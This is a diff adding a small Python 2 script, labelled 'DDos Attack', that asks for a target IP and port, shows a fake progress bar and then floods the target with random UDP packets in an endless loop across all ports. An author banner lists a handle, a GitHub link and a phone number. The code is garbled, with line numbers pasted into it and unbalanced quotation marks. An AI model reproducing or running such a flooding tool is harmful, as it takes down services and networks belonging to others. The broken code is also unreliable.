@@ -1,0 +1,89 @@
+1. import sys
+
+2. import os
+
+3. import time
+
+4. import socket
+
+5. import random
+
+6. #Code Time
+
+7. from datetime import datetime
+
+8. now = datetime.now()
+
+9. hour = now.hour
+
+10. minute = now.minute
+
+11. day = now.day
+
+12. month = now.month
+
+13. year = now.year
+
+14. 
+
+15. ##############
+
+16. sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+17. bytes = random._urandom(1490)
+
+18. #############
+
+19 
+
+20  os.system("clear")
+
+21  os.system("figlet DDos Attack")
+
+22  print
+
+23  print "Author    : Mr_DDOS
+24  print "github    : https://github.com/danielerik12""
+25  print "Facebook  : TIDAK ADA GAYS
+26  print "WhatsAapb : 087702690550
+27  print "instagram : TIDAK ADA GAY
+28  print
+
+29  ip = raw_input("IP Target : ")
+
+30  port = input("Port       : ")
+
+31  os.system("clear")
+
+32  os.system("figlet Attack Starting")
+
+33  print "[                    ] 10% "
+
+34  time.sleep(5)
+
+35  print "[=====               ] 25%"
+
+36  time.sleep(5)
+
+37  print "[==========          ] 50%"
+
+38  time.sleep(5)
+
+39  print "[===============     ] 75%"
+
+40  time.sleep(5)
+
+41  print "[====================] 100%"
+
+42  time.sleep(3)
+
+43  sent = 0
+
+44  while True:
+
+45      sock.sendto(bytes, (ip,port))
+46      sent = sent + 1
+47      port = port + 1
+48      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+49      if port == 65534:
+50        port = 1
